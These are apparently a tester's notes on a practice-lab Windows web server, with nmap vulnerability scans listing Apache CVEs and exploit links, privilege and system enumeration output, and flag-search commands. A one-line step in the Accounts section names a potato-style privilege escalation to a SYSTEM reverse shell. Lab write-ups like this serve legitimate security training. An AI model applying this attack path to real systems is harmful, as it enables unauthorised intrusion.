# 192.168.X.247
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`

- C:\local.txt
- C:\Users\Administrator\Desktop\proof.txt
# Accounts
### system
`see CONNECTION in command history`
`drop sigmapotato and get reverse shell`
### iis apppool\defaultapppool
`see CONNECTION comment in command history`   
`whoami /priv`
```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
`whoami /groups`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.152.247 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
`sudo nmap -sV --script vuln -p- 192.168.240.247`
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
    |_http-trace: TRACE is enabled
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.54: 
    |       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
    |       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565  *EXPLOIT*
    |       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
    |       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
    |       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
    |       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109  *EXPLOIT*
    |       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
    |       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
    |       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
    |       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
    |       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
    |       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30  *EXPLOIT*
    |       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A  *EXPLOIT*
    |       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
    |       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
    |       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
    |       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
    |       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
    |       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
    |       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
    |       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    7.5     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38  *EXPLOIT*
    |       E73E445F-0A0D-5966-8A21-C74FE9C0D2BC    7.5     https://vulners.com/githubexploit/E73E445F-0A0D-5966-8A21-C74FE9C0D2BC  *EXPLOIT*
    |       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
    |       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
    |       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
    |       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
    |       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
    |       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
    |       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
    |       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
    |       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
    |       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
    |       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
    |       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
    |       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
    |       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
    |       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
    |       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    7.5     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B  *EXPLOIT*
    |       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
    |       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
    |       B0B1EF25-DE18-534A-AE5B-E6E87669C1D2    7.5     https://vulners.com/githubexploit/B0B1EF25-DE18-534A-AE5B-E6E87669C1D2  *EXPLOIT*
    |       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
    |       A820A056-9F91-5059-B0BC-8D92C7A31A52    7.5     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52  *EXPLOIT*
    |       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
    |       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
    |       788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D    7.5     https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D  *EXPLOIT*
    |       5A864BCC-B490-5532-83AB-2E4109BB3C31    7.5     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31  *EXPLOIT*
    |       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667  *EXPLOIT*
    |       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
    |       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
    |       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
    |       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    7.5     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680  *EXPLOIT*
    |       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
    |       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
    |       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
    |       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
    |       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
    |       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
    |       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
    |_      CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-enum: 
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/8.1.10'
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/8.1.10'
    |_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/8.1.10'
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-trace: TRACE is enabled
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.54: 
    |       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
    |       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565  *EXPLOIT*
    |       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
    |       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
    |       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
    |       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109  *EXPLOIT*
    |       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
    |       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
    |       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
    |       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
    |       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
    |       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30  *EXPLOIT*
    |       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A  *EXPLOIT*
    |       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
    |       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
    |       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
    |       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
    |       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
    |       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
    |       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
    |       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    7.5     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38  *EXPLOIT*
    |       E73E445F-0A0D-5966-8A21-C74FE9C0D2BC    7.5     https://vulners.com/githubexploit/E73E445F-0A0D-5966-8A21-C74FE9C0D2BC  *EXPLOIT*
    |       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
    |       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
    |       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
    |       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
    |       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
    |       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
    |       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
    |       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
    |       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
    |       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
    |       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
    |       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
    |       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
    |       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
    |       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
    |       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    7.5     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B  *EXPLOIT*
    |       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
    |       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
    |       B0B1EF25-DE18-534A-AE5B-E6E87669C1D2    7.5     https://vulners.com/githubexploit/B0B1EF25-DE18-534A-AE5B-E6E87669C1D2  *EXPLOIT*
    |       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
    |       A820A056-9F91-5059-B0BC-8D92C7A31A52    7.5     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52  *EXPLOIT*
    |       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
    |       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
    |       788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D    7.5     https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D  *EXPLOIT*
    |       5A864BCC-B490-5532-83AB-2E4109BB3C31    7.5     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31  *EXPLOIT*
    |       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667  *EXPLOIT*
    |       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
    |       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
    |       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
    |       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    7.5     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680  *EXPLOIT*
    |       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
    |       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
    |       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
    |       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
    |       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
    |       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
    |       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
    |_      CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
    |_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
    | http-enum: 
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/8.1.10'
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/8.1.10'
    |_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/8.1.10'
    | ssl-dh-params: 
    |   VULNERABLE:
    |   Diffie-Hellman Key Exchange Insufficient Group Strength
    |     State: VULNERABLE
    |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
    |       of insufficient strength, especially those using one of a few commonly
    |       shared groups, may be susceptible to passive eavesdropping attacks.
    |     Check results:
    |       WEAK DH GROUP 1
    |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    |             Modulus Type: Safe prime
    |             Modulus Source: RFC2409/Oakley Group 2
    |             Modulus Length: 1024
    |             Generator Length: 8
    |             Public Key Length: 1024
    |     References:
    |_      https://weakdh.org
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
14020/tcp open  ftp           FileZilla ftpd
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-dombased-xss: Couldn't find any DOM based XSS.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

```
`sudo nmap -A -T4 -p- 192.168.152.247`
```

```
## Local Users
`Get-LocalUser`
```
Name               Enabled Description                                                                                 
----               ------- -----------                                                                                 
Administrator      True    Built-in account for administering the computer/domain                                      
DefaultAccount     False   A user account managed by the system.                                                       
Guest              False   Built-in account for guest access to the computer/domain                                    
mark               True    Mark                                                                                        
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
zachary            True    Zachary LA (Job 1723)  
```
## Local Groups
`Get-LocalGroup`
```
Name                                Description                                                                        
----                                -----------                                                                        
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
Administrators                      Administrators have complete and unrestricted access to the computer/domain        
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the...
Cryptographic Operators             Members are authorized to perform cryptographic operations.                        
Device Owners                       Members of this group can change system-wide settings.                             
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...
Event Log Readers                   Members of this group can read event logs from local machine                       
Guests                              Guests have the same access as members of the Users group by default, except for...
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...
IIS_IUSRS                           Built-in group used by Internet Information Services.                              
Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...
Performance Monitor Users           Members of this group can access performance counter data locally and remotely     
Power Users                         Power Users are included for backwards compatibility and possess limited adminis...
Print Operators                     Members can administer printers installed on domain controllers                    
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteA...
RDS Management Servers              Servers in this group can perform routine administrative actions on servers runn...
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual de...
Remote Desktop Users                Members in this group are granted the right to logon remotely                      
Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
Replicator                          Supports file replication in a domain                                              
Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of S...
System Managed Accounts Group       Members of this group are managed by the system.                                   
Users                               Users are prevented from making accidental or intentional system-wide changes an...
```
## System Info
`systeminfo`
```
Host Name:                 WEB02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA150
Original Install Date:     10/12/2022, 7:53:02 PM
System Boot Time:          5/5/2025, 8:59:15 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,740 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 4,181 MB
Virtual Memory: In Use:    1,322 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5004330
                           [02]: KB5005039
                           [03]: KB5005552
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.203.247
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
## Routes
`route print`
```
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.203.254  192.168.203.247     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.203.0    255.255.255.0         On-link   192.168.203.247    271
  192.168.203.247  255.255.255.255         On-link   192.168.203.247    271
  192.168.203.255  255.255.255.255         On-link   192.168.203.247    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.203.247    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.203.247    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.203.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value                                                                                   
----                           -----                                                                                   
ALLUSERSPROFILE                C:\ProgramData                                                                          
APP_POOL_CONFIG                C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config                           
APP_POOL_ID                    DefaultAppPool                                                                          
APPDATA                        C:\Windows\system32\config\systemprofile\AppData\Roaming                                
CommonProgramFiles             C:\Program Files\Common Files                                                           
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files                                                     
CommonProgramW6432             C:\Program Files\Common Files                                                           
COMPUTERNAME                   WEB02                                                                                   
ComSpec                        C:\Windows\system32\cmd.exe                                                             
DriverData                     C:\Windows\System32\Drivers\DriverData                                                  
LOCALAPPDATA                   C:\Windows\system32\config\systemprofile\AppData\Local                                  
NUMBER_OF_PROCESSORS           2                                                                                       
OS                             Windows_NT                                                                              
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                              
PROCESSOR_ARCHITECTURE         AMD64                                                                                   
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD                                        
PROCESSOR_LEVEL                23                                                                                      
PROCESSOR_REVISION             0102                                                                                    
ProgramData                    C:\ProgramData                                                                          
